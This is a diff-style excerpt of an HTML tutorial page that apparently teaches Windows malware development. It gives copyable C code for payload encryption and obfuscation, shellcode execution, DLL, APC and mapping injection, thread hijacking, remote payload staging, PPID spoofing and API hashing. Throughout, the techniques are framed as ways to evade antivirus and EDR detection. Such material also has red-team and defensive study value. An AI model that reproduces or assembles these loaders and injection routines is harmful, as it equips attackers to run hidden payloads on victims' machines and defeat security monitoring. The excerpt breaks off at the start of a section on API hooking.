+  <h3>.rdata Section</h3>
+  <p>Variables declared with the <code>const</code> keyword are stored in .rdata (read-only data). The "r" indicates the data is read-only &mdash; any attempt to modify it will cause an access violation. However, depending on the compiler, .data and .rdata may be merged, or even merged into .text. Use .rdata for payloads that do not need in-place decryption, but if in-place decryption is required, you must change the memory protection first.</p>
+
+  <div class="callout callout-hint">
+    <div class="callout-title">Tip</div>
+    <p>Payloads can also be stored in any custom section using the pragma directive: <code>#pragma section(".mysec", execute, read, write)</code>. This helps avoid signature detection based on inspecting .data/.rdata sections.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 4 — PAYLOAD ENCRYPTION -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="payload-encryption">
+  <h2><i class="bi bi-lock"></i> Payload Encryption</h2>
+  <p>Payload Encryption is a technique used to hide code within a malicious file, making detection more difficult for security solutions. Encryption helps malware remain undetected for longer periods. However, the more data that is encrypted in a file, the higher the file's entropy &mdash; which can cause security solutions to flag the file as suspicious. The three most common encryption algorithms in malware development are XOR, RC4, and AES.</p>
+
+  <h3 id="xor-enc">XOR Encryption</h3>
+  <p>XOR is the simplest encryption algorithm, suitable for small payloads. Three levels of increasing complexity:</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">// Method 1: XOR with a single byte key (vulnerable to brute force)
+VOID XorByOneKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey) {
+    for (size_t i = 0; i < sShellcodeSize; i++) {
+        pShellcode[i] = pShellcode[i] ^ bKey;
+    }
+}
+
+// Method 2: XOR with key + index (increases key space)
+VOID XorByiKeys(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey) {
+    for (size_t i = 0; i < sShellcodeSize; i++) {
+        pShellcode[i] = pShellcode[i] ^ (bKey + i);
+    }
+}
+
+// Method 3: XOR with a multi-byte key array (hardest to crack)
+VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize,
+                   IN PBYTE bKey, IN SIZE_T sKeySize) {
+    for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
+        if (j >= sKeySize) {
+            j = 0;
+        }
+        pShellcode[i] = pShellcode[i] ^ bKey[j];
+    }
+}</code></pre>
+  </div>
+
+  <div class="callout callout-warn">
+    <div class="callout-title">Recommendation</div>
+    <p>XOR should be used for small payloads (e.g., obfuscating strings). For larger payloads, use AES or RC4 for stronger security and resistance to brute force attacks.</p>
+  </div>
+
+  <h3 id="rc4-enc">RC4 Encryption</h3>
+  <p>RC4 is a fast, efficient, and bidirectional cryptographic algorithm &mdash; the same function is used for both encryption and decryption. RC4 uses the Key Scheduling Algorithm (KSA) to initialize the state array, then uses the Pseudo-Random Generation Algorithm (PRGA) to encrypt data.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">// RC4 Key Scheduling Algorithm (KSA)
+void rc4_init(unsigned char* key, int keylen, unsigned char* S) {
+    int i, j = 0;
+    for (i = 0; i < 256; i++) {
+        S[i] = i;
+    }
+    for (i = 0; i < 256; i++) {
+        j = (j + S[i] + key[i % keylen]) % 256;
+        // Swap S[i] and S[j]
+        unsigned char temp = S[i];
+        S[i] = S[j];
+        S[j] = temp;
+    }
+}
+
+// RC4 Pseudo-Random Generation Algorithm (PRGA)
+void rc4_crypt(unsigned char* S, unsigned char* data, int datalen) {
+    int i = 0, j = 0, k;
+    for (k = 0; k < datalen; k++) {
+        i = (i + 1) % 256;
+        j = (j + S[i]) % 256;
+        // Swap S[i] and S[j]
+        unsigned char temp = S[i];
+        S[i] = S[j];
+        S[j] = temp;
+        // Generate keystream byte
+        int t = (S[i] + S[j]) % 256;
+        data[k] ^= S[t];
+    }
+}</code></pre>
+  </div>
+
+  <div class="callout callout-danger">
+    <div class="callout-title">NEVER hardcode keys!</div>
+    <p>Never hardcode keys directly in source code. Keys can be discovered during reverse engineering. All of the following key representations are detectable: <code>unsigned char* key = "qa210";</code>, <code>unsigned char key[] = {0x71, 0x61, 0x32, ...};</code>, or <code>unsigned char key[] = {'q','a','2','1','0'};</code>. Instead, generate keys at runtime or use a derivation method.</p>
+  </div>
+
+  <h3 id="aes-enc">AES Encryption</h3>
+  <p>AES (Advanced Encryption Standard) is the strongest symmetric encryption algorithm of the three, suitable for large payloads. The <code>tiny-aes-c</code> library provides a lightweight implementation of AES-128/192/256 suitable for malware development. AES uses a block cipher with a 16-byte block size and supports operating modes such as CBC, CTR, and ECB.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">// Using tiny-aes-c to encrypt/decrypt payloads
+#include "aes.h"
+
+struct AES_ctx ctx;
+uint8_t key[16] = { /* derived at runtime */ };
+uint8_t iv[16]  = { /* derived at runtime */ };
+
+// Initialize AES context with key and IV
+AES_init_ctx_iv(&ctx, key, iv);
+
+// Decrypt payload (AES-CBC mode)
+AES_CBC_decrypt_buffer(&ctx, encryptedPayload, payloadSize);</code></pre>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 5 — PAYLOAD OBFUSCATION -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="payload-obfuscation">
+  <h2><i class="bi bi-eye-slash"></i> Payload Obfuscation</h2>
+  <p>Obfuscation is a technique for hiding payloads by transforming them into different formats (IPv4, IPv6, MAC addresses, UUIDs) to avoid signature detection. The payload is converted into strings that appear legitimate, and is only restored to its original form at runtime. These techniques help reduce entropy and make payloads look like normal data during static analysis.</p>
+
+  <h3 id="ip-fuscation">IPv4/IPv6 Fuscation</h3>
+  <p>Transforms the payload into IPv4 or IPv6 address strings. Every 4 bytes of shellcode are represented as one IPv4 address octet. For example: <code>0xFC4883E4</code> becomes <code>252.72.131.228</code>. For IPv6, every 16 bytes of shellcode become one IPv6 address, allowing obfuscation of larger data per entry.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">// IPv4 Deobfuscation - convert IPv4 strings back to shellcode
+BOOL Ipv4Deobfuscation(IN CHAR* Ipv4Array[], IN SIZE_T NmbrOfElements,
+                       OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {
+    PBYTE pBytes = (PBYTE)HeapAlloc(GetProcessHeap(), 0, NmbrOfElements * 4);
+    if (!pBytes) return FALSE;
+
+    for (SIZE_T i = 0; i < NmbrOfElements; i++) {
+        // inet_addr converts "A.B.C.D" to 4 bytes
+        *(DWORD*)(pBytes + i * 4) = inet_addr(Ipv4Array[i]);
+    }
+
+    *ppDAddress = pBytes;
+    *pDSize = NmbrOfElements * 4;
+    return TRUE;
+}</code></pre>
+  </div>
+
+  <h3 id="mac-fuscation">MAC Fuscation</h3>
+  <p>Similar to IPv4, but transforms the payload into MAC addresses. Every 6 bytes of shellcode become one MAC address. The <code>sscanf</code> function with format string <code>"%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx"</code> is used to parse MAC addresses back into bytes.</p>
+
+  <h3 id="uuid-fuscation">UUID Fuscation</h3>
+  <p>Every 16 bytes of shellcode are represented as a UUID (e.g., <code>FC4883E4-F0E8-C000-0000-4151-41505251</code>). Use <code>UuidFromStringA</code> from the WinAPI to convert a UUID string back into 16 binary bytes. This is a powerful technique because UUIDs look completely legitimate in source code and have a fixed size of 16 bytes per entry.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">// UUID Deobfuscation
+BOOL UuidDeobfuscation(IN CONST RPC_CSTR UuidArray[], IN SIZE_T NmbrOfElements,
+                       OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {
+    PBYTE pBytes = (PBYTE)HeapAlloc(GetProcessHeap(), 0, NmbrOfElements * 16);
+    if (!pBytes) return FALSE;
+
+    for (SIZE_T i = 0; i < NmbrOfElements; i++) {
+        // UuidFromStringA converts UUID string to 16 bytes
+        if (RPC_S_OK != UuidFromStringA((RPC_CSTR)UuidArray[i],
+                (UUID*)(pBytes + i * 16))) {
+            return FALSE;
+        }
+    }
+
+    *ppDAddress = pBytes;
+    *pDSize = NmbrOfElements * 16;
+    return TRUE;
+}</code></pre>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 6 — LOCAL PAYLOAD EXEC -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="local-exec">
+  <h2><i class="bi bi-play-circle"></i> Local Payload Execution</h2>
+
+  <h3 id="shellcode-inject">Shellcode Injection (Local)</h3>
+  <p>The process of executing shellcode in the current process consists of the following main steps: allocate a memory region with <code>VirtualAlloc</code>, write the payload to that region, change memory protection if needed, create a thread to execute, and free the memory when done.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">// Local Shellcode Injection - basic process
+BOOL RunShellcode(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode) {
+    // 1. Allocate RW memory region
+    PVOID pAddress = VirtualAlloc(NULL, sSizeOfShellcode,
+                                   MEM_COMMIT | MEM_RESERVE,
+                                   PAGE_READWRITE);
+    if (!pAddress) return FALSE;
+
+    // 2. Write payload to memory region
+    memcpy(pAddress, pShellcode, sSizeOfShellcode);
+
+    // 3. Change protection to RX (executable)
+    DWORD dwOldProtection = 0;
+    if (!VirtualProtect(pAddress, sSizeOfShellcode,
+                        PAGE_EXECUTE_READ, &dwOldProtection))
+        return FALSE;
+
+    // 4. Execute payload using CreateThread
+    HANDLE hThread = CreateThread(NULL, 0,
+                                   (LPTHREAD_START_ROUTINE)pAddress,
+                                   NULL, 0, NULL);
+    if (!hThread) return FALSE;
+
+    // 5. Wait for thread to complete
+    WaitForSingleObject(hThread, INFINITE);
+
+    // 6. Free memory
+    VirtualFree(pAddress, 0, MEM_RELEASE);
+    CloseHandle(hThread);
+    return TRUE;
+}</code></pre>
+  </div>
+
+  <div class="callout callout-danger">
+    <div class="callout-title">RWX is a red flag</div>
+    <p>Using <code>PAGE_EXECUTE_READWRITE</code> (RWX) is a major red flag for AV/EDR. Always use the RW &rarr; Write &rarr; RX flow instead of directly allocating RWX memory. Allocating RWX memory is one of the most suspicious behaviors that security solutions monitor.</p>
+  </div>
+
+  <h3 id="dll-inject">DLL Injection (Process Injection)</h3>
+  <p>DLL Injection is the technique of inserting a DLL into a running process. The process: open a handle to the target process with <code>OpenProcess</code>, allocate memory in the target process with <code>VirtualAllocEx</code>, write the DLL path with <code>WriteProcessMemory</code>, and create a remote thread that calls <code>LoadLibraryA</code> using <code>CreateRemoteThread</code>.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">// DLL Injection into a remote process
+BOOL InjectDll(IN DWORD dwPid, IN const char* dllPath) {
+    // 1. Open handle to target process
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
+    if (!hProcess) return FALSE;
+
+    // 2. Allocate memory in target process
+    SIZE_T sSize = strlen(dllPath) + 1;
+    PVOID pAddress = VirtualAllocEx(hProcess, NULL, sSize,
+                                     MEM_COMMIT | MEM_RESERVE,
+                                     PAGE_READWRITE);
+    if (!pAddress) { CloseHandle(hProcess); return FALSE; }
+
+    // 3. Write DLL path to target process
+    if (!WriteProcessMemory(hProcess, pAddress, dllPath, sSize, NULL)) {
+        CloseHandle(hProcess); return FALSE;
+    }
+
+    // 4. Find LoadLibraryA address
+    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
+    pfnLoadLibraryA pLoadLibraryA = (pfnLoadLibraryA)
+        GetProcAddress(hKernel32, "LoadLibraryA");
+
+    // 5. Create remote thread calling LoadLibraryA
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
+                                         (LPTHREAD_START_ROUTINE)pLoadLibraryA,
+                                         pAddress, 0, NULL);
+    if (!hThread) { CloseHandle(hProcess); return FALSE; }
+
+    WaitForSingleObject(hThread, INFINITE);
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+    return TRUE;
+}</code></pre>
+  </div>
+
+  <h3>Shellcode Injection (Remote)</h3>
+  <p>Remote Shellcode Injection is similar to DLL Injection, but instead of writing a DLL path and calling LoadLibraryA, you write shellcode directly into the target process and create a remote thread to execute at the shellcode address. This technique is more flexible because it does not require a DLL file on disk.</p>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 7 — STAGING           -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="staging">
+  <h2><i class="bi bi-cloud-download"></i> Staging</h2>
+  <p>Staging is the technique of storing payloads at an external source (web server, Windows Registry) rather than embedding them directly in the binary. This helps reduce the executable file size, lower entropy, and allows updating payloads without recompiling. Staging is particularly useful when payloads are large or when you need to change payloads between executions.</p>
+
+  <h3>Web Server Staging</h3>
+  <p>Uses the WinINet API (<code>InternetOpenW</code>, <code>InternetOpenUrlW</code>, <code>InternetReadFile</code>) to download payloads from a remote server. The process: initialize a WinINet session, open the URL, read the data, and close handles. Payload size can be determined dynamically by reading until no more data is available.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">// Download payload from a web server
+BOOL DownloadPayload(IN LPCWSTR url, OUT PBYTE* ppBuffer, OUT SIZE_T* pSize) {
+    HINTERNET hInternet = InternetOpenW(L"Mozilla/5.0",
+                                          INTERNET_OPEN_TYPE_DIRECT,
+                                          NULL, NULL, 0);
+    if (!hInternet) return FALSE;
+
+    HINTERNET hUrl = InternetOpenUrlW(hInternet, url, NULL, 0,
+                                        INTERNET_FLAG_SECURE, 0);
+    if (!hUrl) { InternetCloseHandle(hInternet); return FALSE; }
+
+    // Dynamic payload size - read until no more data
+    DWORD dwBytesRead = 0;
+    SIZE_T totalSize = 0;
+    BYTE tempBuffer[4096];
+    PBYTE pBuffer = NULL;
+
+    while (InternetReadFile(hUrl, tempBuffer, sizeof(tempBuffer), &dwBytesRead)
+           && dwBytesRead > 0) {
+        pBuffer = (PBYTE)HeapReAlloc(GetProcessHeap(), 0, pBuffer,
+                                      totalSize + dwBytesRead);
+        memcpy(pBuffer + totalSize, tempBuffer, dwBytesRead);
+        totalSize += dwBytesRead;
+    }
+
+    *ppBuffer = pBuffer;
+    *pSize = totalSize;
+
+    InternetCloseHandle(hUrl);
+    InternetCloseHandle(hInternet);
+    return TRUE;
+}</code></pre>
+  </div>
+
+  <h3>Windows Registry Staging</h3>
+  <p>The Windows Registry can be used as a payload storage location. Advantages: no network connection required, payloads are stored persistently on the system. Use <code>RegOpenKeyExW</code>, <code>RegSetValueExW</code>, and <code>RegGetValueW</code> to write and read payloads from the Registry. Conditional compilation (<code>#ifdef</code>) can be used to create two separate binaries: one to stage the payload into the Registry, and one to read and execute it.</p>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 8 — THREAD HIJACKING  -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="thread-hijacking">
+  <h2><i class="bi bi-arrow-repeat"></i> Thread Hijacking</h2>
+  <p>Thread Hijacking is a technique that takes control of a running thread to execute malicious code instead of creating a new thread. The main advantage over <code>CreateThread</code>/<code>CreateRemoteThread</code> is that no new thread is created &mdash; this helps avoid detection by security solutions that monitor thread creation. The technique works by suspending a thread, changing its context (specifically the instruction pointer RIP/EIP) to point to the shellcode, and then resuming the thread.</p>
+
+  <h3>Local Thread Hijacking</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">// Local Thread Hijacking
+BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {
+    // 1. Suspend the thread
+    SuspendThread(hThread);
+
+    // 2. Get thread context
+    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
+    if (!GetThreadContext(hThread, &ctx)) {
+        ResumeThread(hThread);
+        return FALSE;
+    }
+
+    // 3. Change instruction pointer (RIP on x64)
+    ctx.Rip = (DWORD64)pAddress;
+
+    // 4. Set the new thread context
+    if (!SetThreadContext(hThread, &ctx)) {
+        ResumeThread(hThread);
+        return FALSE;
+    }
+
+    // 5. Resume thread - will execute from the new address
+    ResumeThread(hThread);
+    return TRUE;
+}</code></pre>
+  </div>
+
+  <h3>Remote Thread Hijacking</h3>
+  <p>Remote Thread Hijacking applies the same principle but to threads of a different process. Additional step: use <code>CreateToolhelp32Snapshot</code> to enumerate threads of the target process, then select an appropriate thread to hijack. This technique completely avoids calling <code>CreateRemoteThread</code> &mdash; an API commonly hooked by EDR.</p>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 9 — APC INJECTION     -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="apc-injection">
+  <h2><i class="bi bi-lightning"></i> APC Injection</h2>
+  <p>Asynchronous Procedure Call (APC) is a Windows mechanism that allows code execution in the context of a specific thread. APC Injection leverages this mechanism to insert a payload into a target thread's APC queue. When the thread enters an alertable state (calling <code>SleepEx</code>, <code>WaitForSingleObjectEx</code>, etc.), the APC will be executed.</p>
+
+  <h3>Standard APC Injection</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">// APC Injection into a remote process
+BOOL ApcInjection(IN DWORD dwPid, IN PBYTE pShellcode, IN SIZE_T sSize) {
+    // 1. Open target process
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
+
+    // 2. Allocate and write shellcode
+    PVOID pAddress = VirtualAllocEx(hProcess, NULL, sSize,
+                                     MEM_COMMIT | MEM_RESERVE,
+                                     PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(hProcess, pAddress, pShellcode, sSize, NULL);
+
+    // 3. Find alertable threads
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    THREADENTRY32 te32 = { .dwSize = sizeof(THREADENTRY32) };
+
+    if (Thread32First(hSnapshot, &te32)) {
+        do {
+            if (te32.th32OwnerProcessID == dwPid) {
+                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE,
+                                             te32.th32ThreadID);
+                // 4. Queue APC to the thread
+                QueueUserAPC((PAPCFUNC)pAddress, hThread, 0);
+                CloseHandle(hThread);
+            }
+        } while (Thread32Next(hSnapshot, &te32));
+    }
+
+    CloseHandle(hSnapshot);
+    CloseHandle(hProcess);
+    return TRUE;
+}</code></pre>
+  </div>
+
+  <h3>Early Bird APC Injection</h3>
+  <p>Early Bird is a variant of APC Injection that executes before the main thread of the process begins running. The process: create a process in a suspended state using <code>CreateProcess</code> with the <code>CREATE_SUSPENDED</code> flag, queue an APC to the main thread, then resume the process. The thread will execute the APC before running the process's main code. This technique is particularly effective because it avoids race conditions &mdash; the thread is guaranteed to be in an alertable state when resumed.</p>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 10 — CALLBACK EXEC    -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="callback-exec">
+  <h2><i class="bi bi-cursor"></i> Callback Code Execution</h2>
+  <p>Callback Code Execution takes advantage of Windows APIs that accept function pointer callbacks as parameters. Instead of creating a new thread or injecting into another process, malware passes the shellcode address as a callback function to legitimate APIs. When the API is called, it executes the callback &mdash; which is the shellcode. This technique is extremely effective because it uses legitimate APIs, does not create new threads, and is difficult to detect through conventional monitoring methods.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">// Callback Code Execution - using EnumWindows
+// Pass shellcode address as the callback
+BOOL result = EnumWindows((WNDENUMPROC)pShellcodeAddress, 0);
+
+// Other callback APIs that can be used:
+// EnumChildWindows, EnumDesktopWindows, EnumSystemLocalesA
+// EnumSystemLocalesW, EnumTimeFormatsA, EnumDesktopWindows
+// CreateTimerQueueTimer, EnumUILanguages
+// CertEnumSystemStore, EnumSystemGeoID</code></pre>
+  </div>
+
+  <div class="callout callout-success">
+    <div class="callout-title">Advantage</div>
+    <p>Callback execution does not require CreateThread or CreateRemoteThread, does not modify thread context, and uses completely legitimate Windows APIs. This is one of the stealthiest techniques for executing shellcode.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 11 — MAPPING INJECTION -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="mapping-injection">
+  <h2><i class="bi bi-map"></i> Mapping Injection</h2>
+  <p>Mapping Injection uses Windows Section objects (shared memory) to inject shellcode into a target process without needing <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code> &mdash; two APIs commonly hooked by EDR. This technique uses <code>NtCreateSection</code>, <code>NtMapViewOfSection</code>, and <code>NtUnmapViewOfSection</code> to create a shared memory section, write the payload to a local view, then map it into the target process.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">// Local Mapping Injection
+BOOL MappingInjection(IN PBYTE pShellcode, IN SIZE_T sSize) {
+    HANDLE hSection = NULL;
+    PVOID pLocalView = NULL;
+    PVOID pRemoteView = NULL;
+    SIZE_T sViewSize = sSize;
+
+    // 1. Create section object
+    NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL,
+                                        &(LARGE_INTEGER){ .QuadPart = sSize },
+                                        PAGE_EXECUTE_READWRITE,
+                                        SEC_COMMIT, NULL);
+
+    // 2. Map section into local process (R/W)
+    NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, 0, 0,
+                       NULL, &sViewSize, ViewUnmap, 0, PAGE_READWRITE);
+
+    // 3. Write shellcode to local view
+    memcpy(pLocalView, pShellcode, sSize);
+
+    // 4. Map section into local process with RX (executable)
+    NtMapViewOfSection(hSection, GetCurrentProcess(), &pRemoteView, 0, 0,
+                       NULL, &sViewSize, ViewUnmap, 0, PAGE_EXECUTE_READ);
+
+    // 5. Execute shellcode
+    HANDLE hThread = CreateThread(NULL, 0,
+                                   (LPTHREAD_START_ROUTINE)pRemoteView,
+                                   NULL, 0, NULL);
+    WaitForSingleObject(hThread, INFINITE);
+
+    // 6. Cleanup
+    NtUnmapViewOfSection(GetCurrentProcess(), pLocalView);
+    NtUnmapViewOfSection(GetCurrentProcess(), pRemoteView);
+    NtClose(hSection);
+    CloseHandle(hThread);
+    return TRUE;
+}</code></pre>
+  </div>
+
+  <h3>Remote Mapping Injection</h3>
+  <p>The remote variant maps the section object into a target process instead of the local process. This completely bypasses <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code> by using <code>NtMapViewOfSection</code> with the target process handle. This technique is considered one of the most sophisticated injection methods available today.</p>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 12 — FUNCTION STOMPING -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="function-stomping">
+  <h2><i class="bi bi-eraser"></i> Function Stomping Injection</h2>
+  <p>Function Stomping (also known as Function Hooking Overwrite) is a technique that overwrites the content of a legitimate function in a loaded DLL with shellcode. Instead of allocating new memory, it uses existing memory that is already marked as executable. This technique helps bypass security checks that monitor the allocation of new executable memory regions.</p>
+
+  <p>The process: load a DLL into the process using <code>LoadLibraryA</code>, find the target function address using <code>GetProcAddress</code>, change the memory protection to RW using <code>VirtualProtect</code>, overwrite the function with shellcode, restore the protection to RX, and execute via a callback or by directly calling the overwritten function.</p>
+
+  <div class="callout callout-hint">
+    <div class="callout-title">Target Function Selection Tip</div>
+    <p>Choose functions that are rarely called during normal operation &mdash; for example, functions in rarely-used DLLs. If you choose a frequently-called function (like CreateFileW), the shellcode will execute multiple times unintentionally or cause crashes.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 13 — SPOOFING         -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="spoofing">
+  <h2><i class="bi bi-incognito"></i> Spoofing</h2>
+
+  <h3>PPID Spoofing (Parent Process ID)</h3>
+  <p>PPID Spoofing changes the parent process of a newly created process, making it appear as if it was launched by a legitimate process (e.g., explorer.exe) rather than the malware. This helps bypass security rules based on parent-child process relationships. The technique uses <code>PROC_THREAD_ATTRIBUTE_LIST</code> and <code>UpdateProcThreadAttribute</code> with <code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code> to specify the parent process.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">// PPID Spoofing - create process with a fake parent process
+BOOL CreateSpoofedProcess(IN DWORD dwParentPid, IN LPCWSTR lpCmdLine) {
+    // Open handle to the parent process to spoof
+    HANDLE hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwParentPid);
+
+    // Initialize STARTUPINFOEX
+    STARTUPINFOEXW si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
+
+    // Allocate PROC_THREAD_ATTRIBUTE_LIST
+    SIZE_T sAttrListSize = 0;
+    InitializeProcThreadAttributeList(NULL, 1, 0, &sAttrListSize);
+    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)
+        HeapAlloc(GetProcessHeap(), 0, sAttrListSize);
+    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &sAttrListSize);
+
+    // Set parent process attribute
+    UpdateProcThreadAttribute(si.lpAttributeList, 0,
+                               PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                               &hParentProcess, sizeof(HANDLE), NULL, NULL);
+
+    // Create process with spoofed PPID
+    CreateProcessW(NULL, (LPWSTR)lpCmdLine, NULL, NULL, FALSE,
+                    EXTENDED_STARTUPINFO_PRESENT, NULL, NULL,
+                    &si.StartupInfo, &pi);
+
+    // Cleanup
+    DeleteProcThreadAttributeList(si.lpAttributeList);
+    CloseHandle(hParentProcess);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return TRUE;
+}</code></pre>
+  </div>
+
+  <h3>Process Argument Spoofing</h3>
+  <p>Process Argument Spoofing creates a process with fake command-line arguments (appearing legitimate, such as <code>notepad.exe C:\Windows\Temp\readme.txt</code>), but then overwrites them with the real arguments in memory before the process actually executes. This technique deceives monitoring tools that only read the initial command line.</p>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 14 — STRING HASHING   -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="string-hashing">
+  <h2><i class="bi bi-hash"></i> String Hashing</h2>
+  <p>String Hashing replaces API name strings with their hash values, helping avoid detection through IAT checking and string scanning. Instead of calling <code>GetProcAddress(hModule, "VirtualAlloc")</code>, you calculate the hash of "VirtualAlloc" and find the function with a matching hash in the DLL's Export Table. Common hashing algorithms:</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">// DjB2 Hash Algorithm
+DWORD HashStringDjb2A(IN PCHAR String) {
+    ULONG Hash = 5381;
+    while (*String) {
+        Hash = ((Hash << 5) + Hash) + *String;
+        String++;
+    }
+    return Hash;
+}
+
+// Jenkins One-At-A-Time 32-bit Hash
+DWORD HashStringJenkinsOneAtATime32BitA(IN PCHAR String) {
+    DWORD Hash = 0;
+    while (*String) {
+        Hash += *String;
+        Hash += Hash << 10;
+        Hash ^= Hash >> 6;
+        String++;
+    }
+    Hash += Hash << 3;
+    Hash ^= Hash >> 11;
+    Hash += Hash << 15;
+    return Hash;
+}</code></pre>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 15 — IAT HIDING       -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="iat-hiding">
+  <h2><i class="bi bi-eye-slash"></i> IAT Hiding &amp; Obfuscation</h2>
+  <p>The IAT (Import Address Table) contains a list of all functions that a program uses &mdash; information that is extremely valuable to AV. IAT Hiding is a technique to remove or conceal this information, preventing AV from knowing which APIs the program uses simply by checking the IAT.</p>
+
+  <h4>Method 1: Dynamic Resolution</h4>
+  <p>Instead of importing APIs at compile time (which leaves traces in the IAT), use <code>GetModuleHandle</code> + <code>GetProcAddress</code> at runtime to obtain function addresses. However, directly calling <code>GetModuleHandle</code> and <code>GetProcAddress</code> still leaves traces in the IAT.</p>
+
+  <h4>Method 2: Custom GetProcAddress &amp; GetModuleHandle</h4>
+  <p>Implement custom versions of <code>GetProcAddress</code> and <code>GetModuleHandle</code> by parsing PE headers directly. The custom GetModuleHandle traverses PEB &rarr; InMemoryOrderModuleList to find DLLs; the custom GetProcAddress parses the DLL's Export Table to find functions by name or hash.</p>
+
+  <h4>API Hashing</h4>
+  <p>Combines String Hashing with IAT Hiding: instead of using string names, use the hash of API names to find functions. This technique completely removes API name strings from the binary, making static analysis much more difficult.</p>
+
+  <h4>Compile-Time API Hashing</h4>
+  <p>Takes API Hashing a step further: hashes are calculated at compile time using <code>constexpr</code> or macros, leaving no strings in the binary. At runtime, only pre-calculated hash values are used to resolve APIs.</p>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 16 — API HOOKING      -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="api-hooking">
